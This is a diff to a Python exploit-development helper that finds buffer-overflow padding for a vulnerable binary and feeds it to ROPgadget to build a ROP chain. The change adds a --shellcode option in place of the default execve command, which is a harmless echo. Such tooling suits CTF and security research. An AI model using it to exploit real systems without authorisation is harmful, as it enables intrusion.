@@ -16,7 +16,7 @@ class InputTypes(Enum):
 # defind the input type (default uses FILE)
 INPUT_TYPE = 0#InputTypes.FILE
 
-TMP_INPUT_FILE_NAME = ".tmp_wad"
+TMP_INPUT_FILE_NAME = ".tmp_pad"
 
 SIZE_OF_ADDRESS_IN_BYTES = 4
 
@@ -86,7 +86,7 @@ def handle_file(vulnerableFile, bof):
     file = open(TMP_INPUT_FILE_NAME, "bw")
     file.write(bof)
     file.close()
-
+    
     # Return result
     return run_strace([vulnerableFile, TMP_INPUT_FILE_NAME])
 
@@ -175,6 +175,8 @@ def handle_args():
     input_group.add_argument("-i", "--stdin", help="Case where the vulnerable input is in STDIN.", action="store_true", default=False)
 
     parser.add_argument("-p", "--pipe", help="Pipe the padded information into ROPgadget.py so that we can create ropchain.", action="store_true", default=False)
+
+    parser.add_argument("--shellcode", type=str, default=None, help="Enables shellcode for the ropchain instead of an execve")
     
     args = parser.parse_args()
 
@@ -193,6 +195,10 @@ def main():
         if (cmd is None):
             cmd = "/bin/echo The exploit is working."
         
-        ropgadget.main(cmd, ["--ropchain", "--binary", args.filePath, "--padding=" + str(padding)])
+        with_shellcode = []
+        if (args.shellcode):
+            with_shellcode = ["--shellcode", args.shellcode]
+        
+        ropgadget.main(cmd, ["--ropchain", "--binary", args.filePath, "--padding=" + str(padding)] + with_shellcode)
 
 main()
